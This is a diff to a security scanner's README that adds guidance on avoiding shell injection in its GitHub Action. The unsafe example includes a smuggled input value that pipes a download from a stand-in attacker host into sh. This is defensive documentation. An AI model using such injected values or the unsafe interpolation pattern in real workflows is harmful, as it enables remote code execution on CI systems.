@@ -242,6 +242,29 @@ As a GitHub Action:
     fail-on: high
 ```
 
+#### Using the GitHub Action safely
+
+Workflow inputs are untrusted text. Writing `${{ inputs.path }}` inside a `run:` block pastes the
+value into the shell script before bash parses it, so an input can become code. The action passes
+inputs through `env:` and uses them quoted:
+
+```yaml
+# unsafe: with path = ". ; curl https://evil.example | sh" the shell runs the second command
+- run: sinkline scan ${{ inputs.path }} --fail-on ${{ inputs.fail-on }}
+
+# safe: the value is data in an environment variable, quoted, one argv entry
+- env:
+    INPUT_PATH: ${{ inputs.path }}
+  run: sinkline scan "$INPUT_PATH"
+```
+
+`fail-on` and `min-confidence` are also checked against an allow-list (`low|medium|high|critical`
+and `low|medium|high`) and the job fails with an error on anything else. `tests/test_action.py` runs
+`scripts/action-scan.sh` with hostile values and checks that nothing is executed and that each
+input reaches the CLI as a single argument. The same rule applies to your own workflows: never put
+`${{ github.event.* }}` or `${{ inputs.* }}` directly in `run:`. Versions before 0.4.1 used the
+unsafe form; pin the action to a commit or tag, not `@main`.
+
 As a [pre-commit](https://pre-commit.com) hook, in `.pre-commit-config.yaml`:
 
 ```yaml
@@ -333,7 +356,8 @@ bench/
   corpus/       labeled ground truth (VULN:CWE-xx / SAFE tags) incl. cross-file + adversarial cases
   score.py      precision / recall / F1 per CWE
   compare_bandit.py
-tests/          unit tests (one small program per engine feature) + corpus gate
+tests/          unit tests (one small program per engine feature) + corpus gate + action tests
+scripts/        action-scan.sh, the script action.yml runs
 docs/DESIGN.md  design write-up
 docs/examples/  real scan output (vulpy, Vulnerable-Flask-App, dvpwa, corpus as HTML and SARIF)
 .pre-commit-hooks.yaml   pre-commit hook definition
